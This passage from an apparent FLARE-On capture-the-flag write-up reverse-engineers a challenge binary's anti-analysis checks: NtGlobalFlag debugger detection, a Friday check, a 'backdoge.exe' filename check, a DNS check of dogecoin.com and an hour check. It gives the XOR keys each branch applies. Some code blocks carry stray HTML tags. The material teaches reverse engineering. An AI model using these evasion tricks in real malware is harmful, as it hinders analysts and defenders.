</span><span class='line'>    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="err">”</span><span class="n">Such</span> <span class="n">fire</span><span class="o">.</span> <span class="n">Much</span> <span class="n">burn</span><span class="o">.</span> <span class="n">Wow</span><span class="o">.</span><span class="err">”</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h3 id="function-7---ntglobalflag">Function 7 - NtGlobalFlag</h3>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">Electric_Boogaloo</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">OutputDebugString</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">ICanHaz?</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4013</span><span class="nv">F0</span>       <span class="c1">; you are here</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401460</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4014</span><span class="nv">F0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401590</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub_4016F0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>This one is pretty straightforward. A field inside the <code>PEB</code> (we have already seen it) is called <code>NtGlobalFlag</code>. This flag is at offset <code>0x68</code> in 32-bit versions of Windows (and <code>0xBC</code> for 64-bit). Usually it is set to zero but it can be changed. A process that is started by a debugger will have this field set to <code>0x70</code>. To read more about it, please look at the <a href="http://pferrie.host22.com/papers/antidebug.pdf">Anti-Debugging</a> reference.</p>

<p><img src="/images/2014/flare/7-12.jpg" alt="&quot;NtGlobalFlag Checked&quot;" title="NtGlobalFlag Checked" /></p>

<p>If <code>NtGlobalFlag</code> is not <code>0x70</code> then <code>\x09\x00\x00\x01</code> will be xor-ed with the blob, otherwise <code>Feel the sting of the monarch!</code>.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>NtGlobalFlag </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">NtGlobalFlag</span> <span class="o">==</span> <span class="mh">0x70</span><span class="p">):</span>
</span><span class='line'>    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="err">”</span><span class="n">Feel</span> <span class="n">the</span> <span class="n">sting</span> <span class="n">of</span> <span class="n">the</span> <span class="n">monarch</span><span class="err">!”</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="err">”</span>\<span class="n">x09</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span><span class="err">”</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h3 id="function-8---sands-of-time">Function 8 - Sands of Time</h3>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">Electric_Boogaloo</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">OutputDebugString</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">ICanHaz?</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">NtGlobalFlag</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401460</span>     <span class="c1">; you are here</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4014</span><span class="nv">F0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401590</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4016</span><span class="nv">F0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p><img src="/images/2014/flare/7-13.jpg" alt="Checking day of the week" title="Checking day of the week" /></p>

<p>This is not a countermeasure but a simple check. First <code>time64</code> is called and returns the number of seconds since January 1st 1970. Then <code>localtime64</code> converts it to <a href="http://msdn.microsoft.com/en-us/library/bf12f0hc.aspx">readabled format</a> stored in a structure of type <code>tm</code> according to MSDN:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>tm </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="c1">// each field is an int (4 bytes)&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="nl">tm_sec:</span>     <span class="n">Seconds</span> <span class="n">after</span> <span class="n">minute</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">59</span><span class="p">)</span>
</span><span class='line'><span class="nl">tm_min:</span>     <span class="n">Minutes</span> <span class="n">after</span> <span class="n">hour</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">59</span><span class="p">)</span>
</span><span class='line'><span class="nl">tm_hour:</span>    <span class="n">Hours</span> <span class="n">after</span> <span class="n">midnight</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">23</span><span class="p">)</span>
</span><span class='line'><span class="nl">tm_mday:</span>    <span class="n">Day</span> <span class="n">of</span> <span class="n">month</span> <span class="p">(</span><span class="mi">1</span> <span class="err">–</span> <span class="mi">31</span><span class="p">)</span>
</span><span class='line'><span class="nl">tm_mon:</span>     <span class="n">Month</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">11</span><span class="p">;</span> <span class="n">January</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'><span class="nl">tm_year:</span>    <span class="n">Year</span> <span class="p">(</span><span class="n">current</span> <span class="n">year</span> <span class="n">minus</span> <span class="mi">1900</span><span class="p">)</span>
</span><span class='line'><span class="nl">tm_wday:</span>    <span class="n">Day</span> <span class="n">of</span> <span class="n">week</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">6</span><span class="p">;</span> <span class="n">Sunday</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">:</span> <span class="nl">offset:</span> <span class="mi">24</span>
</span><span class='line'><span class="nl">tm_yday:</span>    <span class="n">Day</span> <span class="n">of</span> <span class="n">year</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">365</span><span class="p">;</span> <span class="n">January</span> <span class="mi">1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'><span class="nl">tm_isdst:</span>   <span class="n">Positive</span> <span class="n">value</span> <span class="k">if</span> <span class="n">daylight</span> <span class="n">saving</span> <span class="n">time</span> <span class="n">is</span> <span class="n">in</span> <span class="n">effect</span><span class="p">;</span> <span class="mi">0</span> <span class="k">if</span> <span class="n">daylight</span> <span class="n">saving</span> <span class="n">time</span> <span class="n">is</span> <span class="n">not</span> <span class="n">in</span> <span class="n">effect</span><span class="p">;</span> <span class="n">negative</span> <span class="n">value</span> <span class="k">if</span> <span class="n">status</span> <span class="n">of</span> <span class="n">daylight</span> <span class="n">saving</span> <span class="n">time</span> <span class="n">is</span> <span class="n">unknown</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Next instruction <code>cmp dword ptr [eax+18h], 5</code> compares 24th (0x16) byte of the structure with 5. Because each field is of type <code>int</code> and 4 bytes, 24th byte will be the current day of the week. Sunday is 0, so Friday is 5. The application simply checks if it is Friday. If so, it will xor <code>! 50 1337</code> with the blob and if it is not Friday blob will be xor-ed with <code>1337</code>.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Day of the week check </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">Friday</span><span class="p">):</span>
</span><span class='line'>    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="err">”!</span> <span class="mi">50</span> <span class="mi">1337</span><span class="err">”</span><span class="p">)</span>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="err">”</span><span class="mi">1337</span><span class="err">”</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h3 id="function-9---backdogeexe">Function 9 - Backdoge.exe</h3>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">Electric_Boogaloo</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">OutputDebugString</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">ICanHaz?</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">NtGlobalFlag</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">SandsOfTime</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>   <span class="c1">; eax = executable’s name</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4014</span><span class="nv">F0</span>   <span class="c1">; you are here</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401590</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub_4016F0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Before next function, executable’s complete path is saved into <code>eax</code>. Then <code>sub_4014F0</code> is called.</p>

<p><img src="/images/2014/flare/7-14.jpg" alt="Comparing executable's name with backdoge.exe" title="Comparing executable's name with backdoge.exe" /></p>

<p>Again, this is just a check. Executable’s name is compared with <code>backdoge.exe</code> two characters in each iteration.</p>

<p><img src="/images/2014/flare/7-15.jpg" alt="Filename check" title="Filename check" /></p>

<p>The rest is pretty easy. If filename check passes, <code>MATH IS HARD</code> will be xor-ed with the blob and if not <code>LETS GO SHOPPING</code>.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Filename check </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">filename</span> <span class="o">==</span> <span class="err">“</span><span class="n">BackDoge</span><span class="o">.</span><span class="n">exe</span><span class="err">”</span><span class="p">):</span>
</span><span class='line'>    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="err">”</span><span class="n">MATH</span> <span class="n">IS</span> <span class="n">HARD</span><span class="err">”</span><span class="p">)</span>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="err">”</span><span class="n">LETS</span> <span class="n">GO</span> <span class="n">SHOPPING</span><span class="err">”</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h3 id="function-10---dogecoincom-ip-check">Function 10 - Dogecoin.com IP Check</h3>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">Electric_Boogaloo</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">OutputDebugString</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">ICanHaz?</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">NtGlobalFlag</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">SandsOfTime</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">BackDoge</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401590</span>   <span class="c1">; you are here</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4016</span><span class="nv">F0</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Another check. This time the application retrieves the IP for <code>www.dogecoin.com</code> using <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms738524%28v=vs.85%29.aspx">gethostbyname</a>. The result is of the form <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms738552%28v=vs.85%29.aspx">hostent</a>:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>hostent structure (for Win32) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="n">hostent</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">FAR</span>      <span class="o">*</span><span class="n">h_name</span><span class="p">;</span>        <span class="c1">// index: 0</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">FAR</span>  <span class="n">FAR</span> <span class="o">**</span><span class="n">h_aliases</span><span class="p">;</span>    <span class="c1">// index: 4 </span>
</span><span class='line'>  <span class="kt">short</span>         <span class="n">h_addrtype</span><span class="p">;</span>     <span class="c1">// index: 8</span>
</span><span class='line'>  <span class="kt">short</span>         <span class="n">h_length</span><span class="p">;</span>       <span class="c1">// index: 9</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">FAR</span>  <span class="n">FAR</span> <span class="o">**</span><span class="n">h_addr_list</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span> <span class="n">HOSTENT</span><span class="p">,</span> <span class="o">*</span><span class="n">PHOSTENT</span><span class="p">,</span> <span class="n">FAR</span> <span class="o">*</span><span class="n">LPHOSTENT</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p><img src="/images/2014/flare/7-16.jpg" alt="Dogecoin.com IP" title="Dogecoin.com IP" /></p>

<p>Then 8th byte will be compared with <code>2</code> which is <code>h_addrtype</code>. According to this <a href="http://stackoverflow.com/q/2549461">stackoverflow answer</a>, it is <code>AF_INET</code> or <code>PF_INET</code> defined in <a href="http://repo-genesis3.cbi.utsa.edu/crossref/ns-sli/usr/include/bits/socket.h.html">bits/socket.h</a>.</p>

<p><code>inet_ntoa</code> is converting the IP to ASCII IPv4 format (e.g. 192.168.0.1) and comparing it to <code>127.0.0.1</code> two characters at a time like last check.</p>

<p><img src="/images/2014/flare/7-17.jpg" alt="xor paths for ip check" title="xor paths for ip check" /></p>

<p>The xor-string is <code>SHOPPING IS HARD</code> if the resolved IP address is not <code>127.0.0.1</code>. If the IP address is <code>127.0.0.1</code> or <code>h_addrtype</code> is not <code>2</code> then <code>LETS GO MATH</code> will be xor-ed with the blob.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Dogecoin.com IP check </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">h_addrtype</span> <span class="o">!=</span> <span class="mi">2</span> <span class="ow">or</span> <span class="p">(</span><span class="n">Dogecoin_ip</span> <span class="o">==</span> <span class="err">“</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="err">”</span><span class="p">)):</span>
</span><span class='line'>    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="err">”</span><span class="n">LETS</span> <span class="n">GO</span> <span class="n">MATH</span><span class="err">”</span><span class="p">)</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">Dogecoin_ip</span> <span class="o">!=</span> <span class="err">“</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="err">”</span><span class="p">):</span>
</span><span class='line'>    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="err">”</span><span class="n">SHOPPING</span> <span class="n">IS</span> <span class="n">HARD</span><span class="err">”</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h3 id="function-11---hour-of-the-wolf">Function 11 - Hour of the Wolf</h3>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">Electric_Boogaloo</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">OutputDebugString</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">ICanHaz?</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">NtGlobalFlag</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">SandsOfTime</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">BackDoge</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">IPCheck</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub_4016F0</span>   <span class="c1">; you are here</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p><img src="/images/2014/flare/7-18.jpg" alt="Hour check" title="Hour check" /></p>

<p>Again, we see the familiar <code>time64</code> and <code>localtime64</code> calls. This time offset 8 of the <code>tm</code> structure (copied below) is compared with <code>0x11</code> or <code>17</code>. This offset contains the number of hours after midnight, so the application is checking if it is between 5 and 6 PM.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>tm </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="c1">// each field is an int (4 bytes)&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="nl">tm_sec:</span>     <span class="n">Seconds</span> <span class="n">after</span> <span class="n">minute</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">59</span><span class="p">).</span>  <span class="p">;</span> <span class="nl">index:</span> <span class="mi">0</span>
</span><span class='line'><span class="nl">tm_min:</span>     <span class="n">Minutes</span> <span class="n">after</span> <span class="n">hour</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">59</span><span class="p">).</span>    <span class="p">;</span> <span class="nl">index:</span> <span class="mi">4</span>
</span><span class='line'><span class="nl">tm_hour:</span>    <span class="n">Hours</span> <span class="n">after</span> <span class="n">midnight</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">23</span><span class="p">).</span>  <span class="p">;</span> <span class="nl">index:</span> <span class="mi">8</span>
</span><span class='line'><span class="nl">tm_mday:</span>    <span class="n">Day</span> <span class="n">of</span> <span class="n">month</span> <span class="p">(</span><span class="mi">1</span> <span class="err">–</span> <span class="mi">31</span><span class="p">).</span>
</span><span class='line'><span class="nl">tm_mon:</span>     <span class="n">Month</span> <span class="p">(</span><span class="mi">0</span> <span class="err">–</span> <span class="mi">11</span><span class="p">;</span> <span class="n">January</span> <span class="o">=</span> <span class="mi">0</span><span class="p">).</span>
